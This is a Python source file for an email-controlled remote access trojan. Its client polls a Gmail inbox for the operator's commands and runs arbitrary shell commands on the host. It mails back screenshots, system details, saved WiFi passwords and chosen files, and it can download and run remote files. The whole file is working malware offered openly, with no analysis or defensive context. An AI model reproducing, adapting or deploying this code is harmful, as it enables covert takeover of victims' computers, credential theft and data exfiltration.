#VERSION 2.00
from email.mime.text import MIMEText
from email.header import decode_header
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase

import imaplib
import email
import os
import smtplib
import subprocess
import time

#Mods
from mods.screenshot import screenshot
from mods.urlDownload import urlDownload
from mods.systeminfo import systeminfo
from mods.urlUploader import UrlUploader
from mods.helper import Helper
from mods.wifi import WifiPasswordRetriever

#Externals
from externals.templates import create_html_content,shell
from externals.useless import basic_systeminfo

#GettingCreds
from config.config import config

class EmailHandler:
    def __init__(self, username, password, your_mail):
        self.username = username
        self.password = password
        self.your_mail = your_mail
        self.imap_server = "imap.gmail.com"
        self.smtp_server = "smtp.gmail.com"
        self.smtp_port = 587
        

    def clean_text(self, text):
        return "".join(c if c.isalnum() else "_" for c in text)

    def login_imap(self):
        try:
            self.imap = imaplib.IMAP4_SSL(self.imap_server)
            self.imap.login(self.username, self.password)
        except Exception as e:
            print(e)
            self.login_imap()

    def fetch_emails(self, folder="INBOX", num_emails=1):
        self.imap.select(folder)
        status, messages = self.imap.search(None, f"(FROM '{self.your_mail}')")
        print(status)
        email_ids = messages[0].split()[-num_emails:]
        emails = []
        for email_id in email_ids:
            res, msg = self.imap.fetch(email_id, "(RFC822)")
            for response in msg:
                if isinstance(response, tuple):
                    emails.append(email.message_from_bytes(response[1]))
        return emails

    def logout_imap(self):
        self.imap.logout()

    def send_email(self, message,msgId="Somethingdifferent",reply=False):
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = self.your_mail
        if reply:
            msg['In-Reply-To'] = msgId
            msg['References'] = msgId
            try:
                with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                    server.starttls()
                    server.login(self.username, self.password)
                    msg.attach(MIMEText(message, 'html'))
                    server.send_message(msg)
            except Exception as e:
                print(f"Failed to send email: {e}")
        else:
            try:
                with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                    server.starttls()
                    server.login(self.username, self.password)
                    msg.attach(MIMEText(message, 'html'))
                    server.send_message(msg)
                
            except Exception as e:
                print(f"Failed to send email: {e}")
    
    def send_file(self,file,filename,msgId=False,message="File Below"):
        msg = MIMEMultipart()
        msg['From'] = self.username
        msg['To'] = self.your_mail
        if msgId:
            msg['In-Reply-To'] = msgId
            msg['References'] = msgId
        msg.attach(MIMEText(message, 'plain'))
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(file)
        email.encoders.encode_base64(part)
        part.add_header(
        'Content-Disposition',
        f'attachment; filename={filename}',
    )
        
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.username, self.password)
                msg.attach(part)
                server.send_message(msg)
        except Exception as e:
            print(f"Failed to send email: {e}")



class CommandHandler:
    def __init__(self, email_handler):
        self.email_handler = email_handler
        self.msgId = ""

    def execute_command(self, command):
        try:
            output = subprocess.getoutput(command)
            msg = shell(output)
            self.email_handler.send_email(message=msg,msgId=self.msgId,reply=True)
        except Exception as e:
            print(f"Command execution failed: {e}")

    def process_email_commands(self, emails):
        for msg in emails:
            From,encoding = decode_header(msg.get("From"))[0]
            msgId,encoding = decode_header(msg.get("Message-Id"))[0]
            if self.msgId == msgId:
                return None
            else:
                self.msgId = msgId
            if isinstance(From, bytes):
                From = From.decode(encoding or "utf-8")
                # msgId = msgId.decode(encoding or "utf-8")
            # print(f"From: {From}")
            # print(msgId)
            print("!New Message Recieved")

            body = ""
            if msg.is_multipart():
                for part in msg.walk():
                    content_type = part.get_content_type()
                    if content_type == "text/plain":
                        body = part.get_payload(decode=True).decode()
                        print(body)
                        new_body = ''.join(body.splitlines())
                        break
            else:
                content_type = msg.get_content_type()
                if content_type == "text/plain":
                    body = msg.get_payload(decode=True).decode()
                    new_body = ''.join(body.splitlines())

            print(f"Body: {[new_body]}")
            self.handle_command(new_body)
            return True


    def handle_command(self, command):
        #command for System Info
        if ":systeminfo" in command:
            data = systeminfo()
            data.run(
                msgId=self.msgId,
                EmailHandler=self.email_handler
            )
            return None
        
        elif ":wifi" in command:
            data = WifiPasswordRetriever()
            data.run(
                msgId=self.msgId,
                EmailHandler=self.email_handler
            )
            return None
        
        elif command.startswith(":help"):
            help = Helper()
            help.run(
                EmailHandler=self.email_handler,
                msgId=self.msgId
            )
            return None
        
        #Screenshot Executing command
        elif command.startswith(":screenshot"):
            data = screenshot()
            data.run(
                emailHandler=self.email_handler,
                msgId=self.msgId
            )
            return None
        #Command For Executing urldownloads
        elif command.startswith(":urldown"):

            args = command.replace('\n', ' ').split(',')
            try:
                url = args[1]
                filename = args[2]
                toRun = args[3].lower()
                if toRun.startswith("false"):
                    toRun = False
                else:
                    toRun = True
            except IndexError:
                self.email_handler.send_email("Please send mail in correct Format or type help if you want to know")
                return None
            except Exception as e:
                self.email_handler.send_email(f"Unable to Do operation Error: {e} ")
                return None
            if not url.startswith("http"):
                self.email_handler.send_email("Please send mail in correct Format and with a valid Url Regards")
                return None
            down = urlDownload()
            down.run(
                url=url,
                filename=filename,
                EmailHandler=self.email_handler,
                msgId=self.msgId,
                run=toRun
            )
            return None
        
        #Command to upload file into the mail
        elif command.startswith(":upload"):

            args = command.replace('\n', ' ').split(',')
            try:
                filepath = args[1]
                
            except IndexError:
                self.email_handler.send_email("Please send args in correct format")
                return None
            except Exception as e:
                self.email_handler.send_email(f"Unable to Do operation Error: {e} ")
                return None
            down = UrlUploader()
            down.run(
                filepath=filepath,
                EmailHandler=self.email_handler,
                msgId=self.msgId,
            )
            return None
        
        #command to exit the program
        elif 'exit' in command:
            print('Exited successfully')
            self.email_handler.send_email('Exiting, please wait')
            exit()

        #Command to sleep the program
        elif 'sleep' in command:
            sleep_time = int(command.replace('sleep', '').strip())
            print(f'Sleeping for {sleep_time} seconds')
            time.sleep(sleep_time)
        
        #Command every other command goes here as shell command
        if len(command) > 3 and command[0:3] == "cd ":
            try:
                os.chdir(os.path.expanduser(command[3:]))
                msg = shell("Directory changed to: " + os.getcwd())
                self.email_handler.send_email(message=msg,msgId=self.msgId,reply=True)
            except Exception as ex:
                self.email_handler.send_email(f"Error: {e}")
        else:
            self.execute_command(command)


class RATClient:
    def __init__(self, username, password, your_mail,idle_interval):
        self.email_handler = EmailHandler(username, password, your_mail)
        self.command_handler = CommandHandler(self.email_handler)
        self.idle_interval = idle_interval
        self.command_interval = 1 #time in seconds to recheck commands

    def start(self):
        welcom_msg = create_html_content(basic_systeminfo())
        self.email_handler.send_email(welcom_msg)
        last_active = time.time()  # The last time a command was requested from the server.
        idle = False

        while True:
            self.email_handler.login_imap()
            emails = self.email_handler.fetch_emails()
            if self.command_handler.process_email_commands(emails) != None:
                if idle:
                    print("Switching from idle back to normal mode...")
                last_active = time.time()
                idle = False
            else:
                print("No command received.")
            if idle:
                time.sleep(self.idle_interval)
            elif (time.time() - last_active) >= self.idle_interval:
                    print(f"The last command was a while ago, switching to idle... : {time.time() - last_active}")
                    idle = True
            else:
                time.sleep(self.command_interval)
            self.email_handler.logout_imap()
            # print(idle)


if __name__ == "__main__":
    #Credential Class
    creds = config()



    USERNAME = creds.EMAIL
    PASSWORD = creds.PASSWORD
    YOUR_MAIL = creds.YOUREMAIL
    IDLE_INTERVAL = 60 #time after which computer will sleep while it was idle
    # print(USERNAME,PASSWORD,YOUR_MAIL)

    client = RATClient(USERNAME, PASSWORD, YOUR_MAIL,IDLE_INTERVAL)
    client.start()
